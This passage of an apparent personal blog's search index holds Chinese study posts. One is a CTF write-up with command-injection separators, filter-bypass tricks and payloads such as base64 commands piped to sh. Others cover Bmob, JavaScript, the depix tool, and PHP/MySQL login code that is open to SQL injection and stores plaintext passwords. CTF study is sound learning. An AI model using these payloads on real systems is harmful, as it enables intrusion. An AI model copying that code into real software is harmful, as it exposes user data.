（仅当设置了u标志时）匹配一个十六进制数表示的 Unicode 字符。","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://favorhau.github.io/tags/Web/"},{"name":"正则匹配","slug":"正则匹配","permalink":"http://favorhau.github.io/tags/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D/"}]},{"title":"20201226学习日记-BUUCTF小体验","slug":"20201226学习日记-BUUCTF小体验","date":"2020-12-26T15:19:45.000Z","updated":"2020-12-26T16:18:32.000Z","comments":true,"path":"2020/12/26/20201226学习日记-BUUCTF小体验/","link":"","permalink":"http://favorhau.github.io/2020/12/26/20201226%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-BUUCTF%E5%B0%8F%E4%BD%93%E9%AA%8C/","excerpt":"顺便来了一波水题,发现不懂的领域","text":"顺便来了一波水题,发现不懂的领域 [极客大挑战 2019]Http 查看源代码先查看一波源代码，发现 1&lt;a style=&quot;border:none;cursor:default;&quot; onclick=&quot;return false&quot; href=&quot;Secret.php&quot;&gt; 因此去secrect.pnp看看 修改Referer看样子后面会出现UA等老套路了 修改UA果然出现了UA的修改，需要修改成对应的UA 修改X-Forwarded-For比起burp suite 这些我更想用fidder。最后得到flag。 [GXYCTF2019]Ping Ping Ping看了题目/?ip=直接傻眼（逃），顶多看得懂其中有一个参数ip，但接下来手足无措。跑去查了题解，梳理了一下。 考点下面内容来源：https://blog.csdn.net/vanarrow/article/details/108295481 0、命令联合执行12345678; 前面的执行完执行后面的| 管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果） || 当前面的执行出错时（为假）执行后面的&amp; 将任务置于后台执行&amp;&amp; 前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a （换行）%0d （回车）1234567 1、命令绕过空格方法有：1234567891011121314151617$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125; //用逗号实现了空格功能，需要用&#123;&#125;括起来%20 (space)%09 (tab)X=$&#x27;cat\\x09./flag.php&#x27;;$X （\\x09表示tab，也可以用\\x20）123456789101112ps:有时会禁用cat:解决方法是使用tac反向输出命令：linux命令中可以加\\，所以甚至可以ca\\t /fl\\ag123 2、内联执行内联，就是将反引号内命令的输出作为输入执行 123456?ip=127.0.0.1;cat$IFS$9`ls`$IFS在Linux下表示为空格$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用 解题梳理了CSDN网友的思路，总结一下 执行命令用 | 或者;执行命令 1?ip=127.0.0.1;ls /?ip=PING 127.0.0.1 (127.0.0.1): 56 data bytesflag.phpindex.php 判断过滤字符滤了空格和标点，flag等符号，不能直接cat flag cat flag是何方神圣呢？cat命令传送门 /?ip= fxck your space! 过滤了空格，用$&#123;IFS&#125;$代替 1?ip=127.0.0.1;cat$&#123;IFS&#125;flag.php fxck your symbol! 过滤{} 也过滤了{}，用$IFS$1代替 1?ip=127.0.0.1;cat$IFS$1flag.php /?ip= fxck your flag! 不读flag，读index 1?ip=127.0.0.1;cat$IFS$1index.php /?ip=PING 127.0.0.1 (127.0.0.1): 56 data bytes/?ip=|&#39;|&quot;|\\|(|)|[|]|{|}/“, $ip, $match)){ echo preg_match(“/&amp;|/|?|*|&lt;|[\\x{00}-\\x{20}]|&gt;|&#39;|&quot;|\\|(|)|[|]|{|}/“, $ip, $match); die(“fxck your symbol!”); } else if(preg_match(“/ /“, $ip)){ die(“fxck your space!”); } else if(preg_match(“/bash/“, $ip)){ die(“fxck your bash!”); } else if(preg_match(“/.*f.*l.*a.g./“, $ip)){ die(“fxck your flag!”); } $a = shell_exec(“ping -c 4 “.$ip); echo ““; print_r($a);} ?&gt; 一目了然过滤了啥，flag字眼也过滤了，bash也没了，不过sh没过滤： 总结：过滤的特殊字符： 12&amp; / ？ * &lt; x&#123;00&#125;-\\x&#123;1f&#125; &#x27; &quot; \\ () [] &#123;&#125; 空格&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; 构造payload1?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh Y2F0IGZsYWcucGhw是cat flag.php的base64-encode此payload只是其中的一个除此之外还有形如 1?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php 不难看出通过变量替换绕过了过滤。 然后查看源代码得flag 写在后面本篇大部分使用了 https://blog.csdn.net/vanarrow/article/details/108295481 的内容，由于CTF思路确实需要参考。 在后面挂一个很好的命令提示符漏洞绕过与执行的博客总结 https://www.ghtwf01.cn/index.php/archives/273/ 学会绕过过滤的路还有好长的样子","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"}],"tags":[{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://favorhau.github.io/tags/BUUCTF/"},{"name":"Web","slug":"Web","permalink":"http://favorhau.github.io/tags/Web/"}]},{"title":"后端云，YES！","slug":"后端云，YES！","date":"2020-12-26T04:19:45.000Z","updated":"2020-12-26T10:01:18.000Z","comments":true,"path":"2020/12/26/后端云，YES！/","link":"","permalink":"http://favorhau.github.io/2020/12/26/%E5%90%8E%E7%AB%AF%E4%BA%91%EF%BC%8CYES%EF%BC%81/","excerpt":"随着后端的完善，许多后端云服务浮起水面","text":"随着后端的完善，许多后端云服务浮起水面 前面写到简单的用户注册登录功能，其实这时候会想–有没有一个集成的用户接口，供我们调用，而省去了一系列的功能呢？后端云的功能包括有云函数、短信验证码、数据储存等功能，可以理解为一个”大后端“，常有的后端云服务提供商有bmob、leancloud等。突然想起前面写到过尚未完工的登录注册功能，所以继续来探究数据储存（登录注册）的功能 文件的引入Bmob的JavaScript SDK基于Backbone.js框架开发，在使用过程中除Bmob.view类需要提供jQuery或者类似JQuery的$方法外，不需要再引入其他类库。 12&lt;script type=&quot;text/javascript&quot; src=&quot;jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;Bmob-2.2.5.min.js&quot;&gt;&lt;/script&gt; 在这里下载了bomb最新的sdk。 控制台测试通过控制台测试查看返回值。 新建一个用户先新建一个用户，用户名为admin密码为admin。 查看返回值12345Bmob.User.login(&#x27;admin&#x27;,&#x27;admin&#x27;).then(res =&gt; &#123; console.log(res) &#125;).catch(err =&gt; &#123; console.log(err)&#125;); 根据文档在JavaScript下添加如上代码。 1234567&#123;createdAt: &quot;2020-12-26 15:10:29&quot;, objectId: &quot;49n3GGGL&quot;, sessionToken: &quot;f6f05579407b5e518048c32884f566f0&quot;, updatedAt: &quot;2020-12-26 15:13:48&quot;, username: &quot;admin&quot;&#125;createdAt: &quot;2020-12-26 15:10:29&quot;objectId: &quot;49n3GGGL&quot;sessionToken: &quot;f6f05579407b5e518048c32884f566f0&quot;updatedAt: &quot;2020-12-26 15:13:48&quot;username: &quot;admin&quot;__proto__: Object 得到以上的返回结果：登录成功。此时回想起前面的mysql，感觉后端云还是挺棒的。 基础表单设定需要完成用户的注册、登录以及美化，才算是一个相对完整的登录注册表单（吧）。 引入前端框架emmm，我们看到过许多HTML5沉浸式的前端登录表单，由于功底不足，先找一些开源的表单样式。感觉这样的还不需动用到Github，直接去源码之家找一个就好。 很可!附上出处：https://tj.mycodes.net/202011/denglukuangqiehuan.zip 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;后端云用户注册登录&lt;/title&gt;&lt;!--前端样式来源：源码之家--&gt;&lt;!--图标库--&gt;&lt;link rel=&#x27;stylesheet&#x27; href=&#x27;css/font-awesome.min.css&#x27;&gt;&lt;!--核心样式--&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;card&quot;&gt;&lt;/div&gt; &lt;div class=&quot;card&quot;&gt; &lt;h1 class=&quot;title&quot;&gt;用户登录&lt;/h1&gt; &lt;form&gt; &lt;div class=&quot;input-container&quot;&gt; &lt;input type=&quot;#&#123;type&#125;&quot; id=&quot;#&#123;label&#125;&quot; required=&quot;required&quot; /&gt; &lt;label for=&quot;#&#123;label&#125;&quot;&gt;用户名&lt;/label&gt; &lt;div class=&quot;bar&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;input-container&quot;&gt; &lt;input type=&quot;#&#123;type&#125;&quot; id=&quot;#&#123;label&#125;&quot; required=&quot;required&quot; /&gt; &lt;label for=&quot;#&#123;label&#125;&quot;&gt;密码&lt;/label&gt; &lt;div class=&quot;bar&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;button-container&quot;&gt; &lt;button&gt;&lt;span&gt;登录&lt;/span&gt;&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;div class=&quot;card alt&quot;&gt; &lt;div class=&quot;toggle&quot;&gt;&lt;/div&gt; &lt;h1 class=&quot;title&quot;&gt;会员注册 &lt;div class=&quot;close&quot;&gt;&lt;/div&gt; &lt;/h1&gt; &lt;form&gt; &lt;div class=&quot;input-container&quot;&gt; &lt;input type=&quot;#&#123;type&#125;&quot; id=&quot;#&#123;label&#125;&quot; required=&quot;required&quot; /&gt; &lt;label for=&quot;#&#123;label&#125;&quot;&gt;用户名&lt;/label&gt; &lt;div class=&quot;bar&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;input-container&quot;&gt; &lt;input type=&quot;#&#123;type&#125;&quot; id=&quot;#&#123;label&#125;&quot; required=&quot;required&quot; /&gt; &lt;label for=&quot;#&#123;label&#125;&quot;&gt;密码&lt;/label&gt; &lt;div class=&quot;bar&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;input-container&quot;&gt; &lt;input type=&quot;#&#123;type&#125;&quot; id=&quot;#&#123;label&#125;&quot; required=&quot;required&quot; /&gt; &lt;label for=&quot;#&#123;label&#125;&quot;&gt;确认密码&lt;/label&gt; &lt;div class=&quot;bar&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;button-container&quot;&gt; &lt;button&gt;&lt;span&gt;提交注册&lt;/span&gt;&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt;&lt;script src=&#x27;js/jquery.min.js&#x27;&gt;&lt;/script&gt;&lt;script src=&quot;js/script.js&quot;&gt;&lt;/script&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 这是一个非常好的前端源码，那么问题来了？如何与后端配合完成用户注册登录的功能呢？ 引入JavaScript SDK引入此段代码，将Bmob-2.2.5.min.js并入js文件夹中。 1&lt;script type=&quot;text/javascript&quot; src=&quot;js/Bmob-2.2.5.min.js&quot;&gt;&lt;/script&gt; 在script.js中添加 1Bmob.initialize(&quot;1c30ea567*******&quot;,&quot;*****&quot;);//分别为secret key和安全密码 添加注册登录事件在按钮处添加onclick事件,并且修改一下id。 123456789101112131415&lt;form action=&quot;#&quot;&gt; &lt;div class=&quot;input-container&quot;&gt; &lt;input type=&quot;#&#123;type&#125;&quot; id=&quot;login_u&quot; required=&quot;required&quot; /&gt; &lt;label for=&quot;#&#123;label&#125;&quot;&gt;用户名&lt;/label&gt; &lt;div class=&quot;bar&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;input-container&quot;&gt; &lt;input type=&quot;#&#123;type&#125;&quot; id=&quot;login_p&quot; required=&quot;required&quot; /&gt; &lt;label for=&quot;#&#123;label&#125;&quot;&gt;密码&lt;/label&gt; &lt;div class=&quot;bar&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;button-container&quot;&gt; &lt;button onclick=&quot;login(event)&quot;&gt;&lt;span&gt;登录&lt;/span&gt;&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; 123456789function login(e)&#123;Bmob.User.login(document.getElementById(&quot;login_u&quot;).value,document.getElementById(&quot;login_p&quot;).value).then(res =&gt; &#123; alert(&quot;success&quot;); console.log(res) &#125;).catch(err =&gt; &#123; alert(&quot;false&quot;); console.log(err) &#125;);&#125; 注册页面同理 1234567891011121314151617181920 &lt;form action=&quot;#&quot;&gt; &lt;div class=&quot;input-container&quot;&gt; &lt;input type=&quot;#&#123;type&#125;&quot; id=&quot;register_u&quot; required=&quot;required&quot; /&gt; &lt;label for=&quot;#&#123;label&#125;&quot;&gt;用户名&lt;/label&gt; &lt;div class=&quot;bar&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;input-container&quot;&gt; &lt;input type=&quot;#&#123;type&#125;&quot; id=&quot;register_p&quot; required=&quot;required&quot; /&gt; &lt;label for=&quot;#&#123;label&#125;&quot;&gt;密码&lt;/label&gt; &lt;div class=&quot;bar&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;input-container&quot;&gt; &lt;input type=&quot;#&#123;type&#125;&quot; id=&quot;register_p2&quot; required=&quot;required&quot; /&gt; &lt;label for=&quot;#&#123;label&#125;&quot;&gt;确认密码&lt;/label&gt; &lt;div class=&quot;bar&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;button-container&quot;&gt; &lt;button onclick=&quot;register(event)&quot;&gt;&lt;span&gt;提交注册&lt;/span&gt;&lt;/button&gt; &lt;/div&gt;&lt;/form&gt; 12345678910111213141516function register(e)&#123; let params = &#123; username: document.getElementById(&quot;register_u&quot;).value, password: document.getElementById(&quot;register_p&quot;).value, &#125;Bomb.User.register(params).then(res =&gt; &#123; console.log(res) alert(&quot;success&quot;); window.location.href=&quot;welcome.html&quot;; &#125;).catch(err =&gt; &#123; alert(&quot;false&quot;); console.log(err) &#125;);&#125; 测试注册登录测试一下注册查询一下后端云的结果-这样子一个简单的壳就弄好了。同理可用于微信小程序当中。 表单验证JavaScript 可用来在数据被送往服务器前对 HTML 表单中的这些输入数据进行验证。 表单数据经常需要使用 JavaScript 来验证其正确性 验证必填项目12345if(document.getElementById(&quot;login_u&quot;).value==&quot;&quot; || document.getElementById(&quot;login_p&quot;).value==&quot;&quot;)&#123; alert(&quot;请输入用户名和密码&quot;); return false;&#125; 验证两次密码是否一致12345if(document.getElementById(&quot;login_u&quot;).value==&quot;&quot; || document.getElementById(&quot;login_p&quot;).value==&quot;&quot;)&#123; alert(&quot;请输入用户名和密码&quot;); return false;&#125; 其他表单验证其实是一个很复杂的过程，从规范层面来说，可能需要检测输入是否合法，从安全角度来说，需要检测是否存在sql注入等，这里面的检测暂且忽略安全问题。 登录状态保持用户登录不得不去解决登录状态保持的问题（可能专业一点称为”保持会话“），一般可以通过cookie去维持。Cookie 是一些数据, 存储于你电脑上的文本文件中。当 web 服务器向浏览器发送 web 页面时，在连接关闭后，服务端不会记录用户的信息。Cookie 的作用就是用于解决 “如何记录客户端的用户信息” Cookie 以名/值对形式存储username=John Doe 设置cookie函数新建welcome.html设置代码 1234567function setCookie(cname,cvalue,exdays)&#123; var d = new Date(); d.setTime(d.getTime()+(exdays*24*60*60*1000)); var expires = &quot;expires=&quot;+d.toGMTString(); document.cookie = cname + &quot;=&quot; + cvalue + &quot;; &quot; + expires;&#125; 获取cookie的函数1234567891011function getCookie(cname)&#123; var name = cname + &quot;=&quot;; var ca = document.cookie.split(&#x27;;&#x27;); for(var i=0; i&lt;ca.length; i++) &#123; var c = ca[i].trim(); if (c.indexOf(name)==0) return c.substring(name.length,c.length); &#125; return &quot;&quot;;&#125; 嵌入js代码在登录表单成功后添加下面的代码，设置登录状态。 1setCookie(&quot;username&quot;,document.getElementById(&quot;login_u&quot;).value,365); 设置页面重定向 1window.location.href=&quot;welcome.html&quot;; 在welcome.html设置显示cookie 1alert(getCookie(&quot;username&quot;)); 登录以后可以看到后台缓存了cookie 有一个很奇妙的东西：经测试谷歌浏览器无法在本地文件保存cookie，火狐可以。 写在后面算是终于把一个（拿得出手）的正常表单完成了，个人感觉表单不论是对于开发还是对于安全的意义还是十分重要的，写完发现-php好像不见了。随着后端的发展和成熟，越来越多的工作交给云后端或许正是趋势，可能不久的将来，将会有更多如同react、node.js出现。","categories":[{"name":"码农日常","slug":"码农日常","permalink":"http://favorhau.github.io/categories/%E7%A0%81%E5%86%9C%E6%97%A5%E5%B8%B8/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://favorhau.github.io/tags/JavaScript/"},{"name":"数据库","slug":"数据库","permalink":"http://favorhau.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"20201225学习日记-初识Javascript","slug":"20201225学习日记-初识Javascript","date":"2020-12-25T02:19:45.000Z","updated":"2021-09-06T01:28:26.274Z","comments":true,"path":"2020/12/25/20201225学习日记-初识Javascript/","link":"","permalink":"http://favorhau.github.io/2020/12/25/20201225%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-%E5%88%9D%E8%AF%86Javascript/","excerpt":"前面粗略了解了一下HTML和CSS，接下来该到了不可或缺的JavaScript了。","text":"前面粗略了解了一下HTML和CSS，接下来该到了不可或缺的JavaScript了。 JavaScript (JS) is a lightweight, interpreted, or just-in-time compiled programming language with first-class functions在这里记录一下学习过程中的小收获吧。 变量：let与var第一次见到这样的两种变量的声明方式var and let are both used for variable declaration in javascript but the difference between them is that var is function scoped and let is block scoped.It can be said that a variable declared with var is defined throughout the program as compared to let.ES6新增了let命令，用来声明局部变量。用法类似于var。但是所声明的变量，只在let命令所在的代码块内有效。二者的区别有 1. let只在块内有效先看用到 var 的一段代码。 1234567function doSomething () &#123; for (var i = 0; i &lt; 5; i++) &#123; console.log(i) &#125; console.log(&#x27;Finally &#x27; + i)&#125;doSomething() 12345601234Finally 5 再看用到 let 的一段代码。 12345678function doSomething () &#123; for (let i = 0; i &lt; 5; i++) &#123; console.log(i) &#125; console.log(&#x27;Finally &#x27; + i)&#125;doSomething() 打印结果如下： 1234567801234/Users/dkvirus/Documents/study/study-typescript/ex1/var.js:5 console.log(&#x27;Finally &#x27; + i)ReferenceError: i is not defined 2. 变量提升使用 let 语句声明一个变量，该变量的范围限于声明它的块中。 可以在声明变量时为变量赋值，也可以稍后在脚本中给变量赋值。 使用 let 声明的变量，在声明前无法使用，否则将会导致错误。 语法结构javascript许多语法的设计是参考Java的，而Java的语法是参考C的，而也有轻微差异。 JavaScript数据类型JavaScript 变量能够保存多种数据类型：数值、字符串值、数组、对象等等： 1234var length = 7; // 数字var lastName = &quot;Gates&quot;; // 字符串var cars = [&quot;Porsche&quot;, &quot;Volvo&quot;, &quot;BMW&quot;]; // 数组var x = &#123;firstName:&quot;Bill&quot;, lastName:&quot;Gates&quot;&#125;; // 对象 JavaScript函数js函数和C最大的特点在于，js不需要声明数据类型，而数据类型有一种（“隐式转换”）的感觉， 123function myFunction(p1, p2) &#123; return p1 * p2; // 该函数返回 p1 和 p2 的乘积&#125; JavaScript指针？JavaScript不存在指针通过传递引用的副本来传递对象。程序员无法访问任何表示对象地址的类似C的“值”。在一个函数中,可以通过该引用更改传递的对象的内容,但是您不能修改调用者拥有的引用,因为您的引用只是一个副本。 其他JavaScript的语法结构，包括对于object对象的声明处理等，都和C有着一些差异，这里不做记录。 HTML DOM说道JavaScript就不得不说HTML DOM，DOM (Document Object Model) 译为文档对象模型，是 HTML 和 XML 文档的编程接口。 在这里用runoob的一张图。 可以理解为，html上的组件，都有一个接口事件，而js可以监听相关事件，当产生事件时可以进行一系列的操作。 写在后面这篇仅仅记录一下学习过程中的心得，很多实际需要用到的比如说node.js都没有记录在此，希望下一篇能记录下node.js的相关。","categories":[{"name":"码农日常","slug":"码农日常","permalink":"http://favorhau.github.io/categories/%E7%A0%81%E5%86%9C%E6%97%A5%E5%B8%B8/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://favorhau.github.io/tags/JavaScript/"}]},{"title":"depix-马赛克逆转神器","slug":"depix-马赛克逆转神器","date":"2020-12-22T04:29:26.000Z","updated":"2021-09-06T01:28:49.729Z","comments":true,"path":"2020/12/22/depix-马赛克逆转神器/","link":"","permalink":"http://favorhau.github.io/2020/12/22/depix-%E9%A9%AC%E8%B5%9B%E5%85%8B%E9%80%86%E8%BD%AC%E7%A5%9E%E5%99%A8/","excerpt":"最近有一个开源项目depix在github上面很火–通过特定的算法可将马赛克恢复。","text":"最近有一个开源项目depix在github上面很火–通过特定的算法可将马赛克恢复。 公众号等纷纷对其具体展开。对，就是这个depix！站在巨人的肩膀上，来体验一下有趣的世界。 写在前面为什么要写此文章呢？一来我觉得这个project十分有趣，能颠倒我的认识；二来有一点直觉，CTF可以围绕着这个方向去出题（如果不知道这个的话恐怕就做不了了）。所以就有了下面的文字。 预期准备 安装python我觉得这一步可以直接略过，安装python和配置环境变量 下载GitHub上的depix文件&lt;a herf=”#可能遇到的问题” οnclick=”js_method()”&gt;可能遇到的问题概述 来看一下项目的介绍Depix is a tool for recovering passwords from pixelized screenshots.This implementation works on pixelized images that were created with a linear box filter.In this article I cover background information on pixelization and similar research.一个可以将马赛克化后截图恢复的工具 作者给出的使用示例为 1python depix.py -p images/testimages/testimage3_pixels.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o output.png 使用方法从屏幕快照中将像素块切为单个矩形在这里作者给出的示例图1为 在具有相同字体设置（文本大小，字体，颜色，hsl）的编辑器中，粘贴带有预期字符的De Bruijn序列，制作序列的屏幕截图作者给出的序列为说白了也就相当于一个图像字典吧。 运行1python depix.py -p [pixelated rectangle image] -s [search sequence image] -o output.png [pixelated rectangle image] 这个参数是指被像素化后的图片 [search sequence image] 指序列化图像（字典） -o 输出目录 进入指定的目录，使用cmd。在文件目录下输入 1python depix.py -p images/testimages/testimage1.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o output.png 在这里均使用了作者提供的默认图片，运行的时候需要一点时间。 还原后的图片 可能遇到的问题 ImportError: No module named PIL 未安装 pillow（python的图像处理库）这时候需要在文件目录键入一下命令。 pip install pillow 参考链接 局限目前该项目的局限性挺多，根据作者给出的算法解释The algorithm uses the fact that the linear box filter processes every block separately. For every block it pixelizes all blocks in the search image to check for direct matches. 使用了“线性盒式滤波器”，也就是如果使用微信上的马赛克就会对还原效果产生影响。 同时在还原的时候需要将图像切割成相应的块。 需要用到序列化的图像，这也就意味着会给汉字的匹配带来许多困难。 无法实时逆转 写在后面无论如何，depix始终是一个十分有趣的开源项目。（可能下一道misc就会与此有关）","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"},{"name":"教程","slug":"教程","permalink":"http://favorhau.github.io/categories/%E6%95%99%E7%A8%8B/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://favorhau.github.io/tags/CTF/"},{"name":"马赛克","slug":"马赛克","permalink":"http://favorhau.github.io/tags/%E9%A9%AC%E8%B5%9B%E5%85%8B/"}]},{"title":"PHP+MYSQL实现简单的用户注册功能","slug":"PHP+MYSQL实现简单的用户注册功能","date":"2020-12-21T14:29:26.000Z","updated":"2020-12-21T11:05:40.000Z","comments":true,"path":"2020/12/21/PHP+MYSQL实现简单的用户注册功能/","link":"","permalink":"http://favorhau.github.io/2020/12/21/PHP+MYSQL%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E5%8A%9F%E8%83%BD/","excerpt":"~冬至快乐！ 有必要用一下php+mysql实现一下这个“最基础”的用户功能，（虽然开发可能会用后端云）","text":"~冬至快乐！ 有必要用一下php+mysql实现一下这个“最基础”的用户功能，（虽然开发可能会用后端云） 基础结构html+css+JavaScript作前端渲染；php作为后端，mysql作为数据库。在这里暂时不涉及到安全问题（比如验证码和token等）组成分为：注册页面与登录页面。 登录页面为什么我先从登录页面开始？因为我觉得整一个流程最核心的部分就在于登录因为无论如何，注册可以通过自己在数据增加完成假后台，而我们作为一个user需要去获得admin就需要通过登录去完成。 login.html123456789101112131415161718//login.html&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Login&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;login.php&quot; method=&quot;POST&quot;&gt; &lt;p&gt;username:&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt; &lt;p&gt;password:&lt;input type=&quot;text&quot; name=&quot;password&quot;&gt;&lt;/p&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; login.php写完了html页面该到php了。 12345678910111213141516171819202122232425262728293031323334353637//login.php&lt;?phpheader(&#x27;cotent-type:text/html;charset=utf-8&#x27;);//receive the data from client$name=$_POST[&quot;username&quot;];$pwd=$_POST[&quot;password&quot;];//telnet mysql$db=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;);//select the databasesif(!$db)&#123; die(&#x27;数据库连接失败&#x27;.$mysql_error());&#125;mysql_select_db(&quot;favorhau&quot;,$db);//decodemysql_query(&quot;set names utf8&quot;);//check$sql=&quot;select * from administrator where username =&#x27;$name&#x27;&quot;;$res= mysql_query($sql);$nub= mysql_num_rows($res);if($nub==0)&#123; echo &quot;&lt;script&gt;alert(&#x27;null&#x27;)&lt;/script&gt;&quot;;&#125;//echowhile($rs=mysql_fetch_object($res))&#123; if($rs-&gt;password!=$pwd) &#123; echo &quot;&lt;script&gt;alert(&#x27;false&#x27;)&lt;/script&gt;;&quot;; mysql_close(); &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;success&#x27;)&lt;/script&gt;;&quot;; mysql_close(); &#125;&#125; 此时，其实一个用户系统已经可以开始启用了，可以来试一下。php和html是可以写在一起的新建一个数据库，数据表，字段为相应的“username”和“password”。（当然也可以使用sql语句）我们先模拟注册（新建一个值admin对应密码admin）此时已经拥有一个用户admin了。 这时候一个无样式的表单就完成了 可以具备登录的功能。 注册页面那么当然，登录需要对应有注册。这时候就需要进行注册页面的设置。 register.html为了能更清楚地展现前端后端的作用，还是采用了分开文件的编写方式。 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;register&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;register.php&quot; method = &quot;POST&quot;&gt; &lt;p&gt;用户名：&lt;input type=&quot;text&quot; name = &quot;uname&quot;&gt;&lt;/p&gt; &lt;p&gt;密码：&lt;input type=&quot;text&quot; name = &quot;upwd&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;button&gt;注册&lt;/button&gt;&lt;/p&gt; &lt;div&gt;&lt;/div&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 由于是注册，需要对输入的内容进行验证，需要加上JavaScript的代码。 12345678910111213141516171819202122232425262728293031323334353637383940414243//获取form元素：var oForm = document.forms[0];//console.log(oForm);//给oForm 添加onsubmit事件：oForm.onsubmit = function()&#123; //判断如果用户名、密码符合规则，则可以提交，否则不能提交； if(flagname&amp;&amp;flagpwd)&#123; return true; &#125;else&#123; return false; &#125;&#125;//获取用户名、密码元素：var oName = oForm.elements[0];var oPwd = oForm.elements[1];var oDiv = document.querySelector(&#x27;div&#x27;);console.log(oDiv);//声明一个变量控制onsubmit提交：var flagname = null;//添加失焦事件：oName.onblur = function()&#123; var reg = /^\\w&#123;6,10&#125;/; var str = oForm.elements[0].value; if(reg.test(str))&#123; flagname = true; &#125;else&#123; oDiv.innerHTML = &quot;包含字母、数字、下划线，在6-10位之间&quot;; flagname = false; &#125;&#125;//声明一个变量控制onsubmit提交：var flagpwd = null;//添加失焦事件：oPwd.onblur = function()&#123; var reg = /^\\w&#123;6,10&#125;/; var str = oForm.elements[1].value; if(reg.test(str))&#123; flagpwd = true; &#125;else&#123; oDiv.innerHTML = &quot;包含字母、数字、下划线，在6-10位之间&quot;; flagpwd = false; &#125;&#125; register.php此时和index.php很像。 123456789101112131415161718192021222324&lt;?phpheader(&#x27;content-type:text/html;charset=utf-8&#x27;);//接受客户端的数据：$name = $_POST[&quot;uname&quot;];$pwd = $_POST[&quot;upwd&quot;];//操作数据库：//连接数据源：$db = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;);//选择数据库：mysql_select_db(&quot;favorhau&quot;,$db);//设置编码符：mysql_query(&quot;set names utf8&quot;);//编写sql语句：$sql = &quot;INSERT INTO `administrator`( `username`, `password`) VALUES (&#x27;$name&#x27;,&#x27;$pwd&#x27;)&quot;;//执行sql语句：$res = mysql_query($sql);//返回数据：if($res)&#123; echo&quot;&lt;script&gt;alert(&#x27;注册成功！&#x27;);location.href = &#x27;login.html&#x27;;&lt;/script&gt;&quot;;&#125;else&#123; 